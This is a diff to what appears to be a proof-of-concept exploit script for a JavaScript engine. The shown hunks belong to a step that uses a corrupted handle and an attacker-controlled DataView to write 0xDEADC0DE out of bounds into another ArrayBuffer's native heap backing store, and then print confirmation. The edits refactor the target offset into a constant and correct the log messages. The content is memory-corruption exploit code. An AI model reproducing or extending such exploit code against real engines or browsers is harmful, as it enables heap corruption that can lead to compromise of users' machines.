@@ -258,7 +258,8 @@ banner('STEP 9 — OOB WRITE: native heap write via corrupted EPT handle');
 //     → SIGBUS in DataView.prototype.setUint32  ← crash visible in stack trace
 
 const SPY_STRIDE = 0x40;   // confirmed: each spy AB is 64 bytes
-const target_off = 100 * SPY_STRIDE;  // 0x1900 — well within confirmed readable zone
+const TARGET_K   = 100;
+const target_off = TARGET_K * SPY_STRIDE;  // 0x1900 — well within confirmed readable zone
 
 const oob_dv = new DataView(attacker);
 
@@ -276,7 +277,7 @@ print('');
 
 print('  ═══ OOB WRITE ═══════════════════════════════════════════════');
 print('  oob_dv.setUint32(0x' + target_off.toString(16) + ', 0xDEADC0DE, true)');
-print('  → writes to spy[' + TARGET_K + ']_bs[0]  (not our memory — foreign backing_store!)');
+print('  → writes to spy[0]_bs + 0x' + target_off.toString(16) + '  (not our memory — foreign backing_store!)');
 oob_dv.setUint32(target_off, 0xDEADC0DE, true);
 print('  WRITE ISSUED');
 print('  ═════════════════════════════════════════════════════════════');
@@ -300,7 +301,7 @@ if (after_oob === 0xDEADC0DE) {
     print('');
     print('  ═══ OOB WRITE FULLY CONFIRMED ═══════════════════════════════');
     print('  spy[' + affected_k + '][0] = 0xDEADC0DE  (was 0xDEADBEEF)');
-    print('  spy[' + affected_k + ']_bs = spy[0]_bs + 0x' + target_off.toString(16) + ' = spy[0]_bs + ' + affected_k + ' * 0x40');
+    print('  spy[' + affected_k + ']_bs = spy[0]_bs + 0x' + target_off.toString(16) + '  (= ' + (target_off/0x40) + ' * 0x40 strides from spy[0]_bs)');
     print('  Write done via attacker DataView (backing_store = spy[0])');
     print('  spy[' + affected_k + '] has a DIFFERENT backing_store — this is OOB native heap write!');
     print('  ══════════════════════════════════════════════════════════════\n');
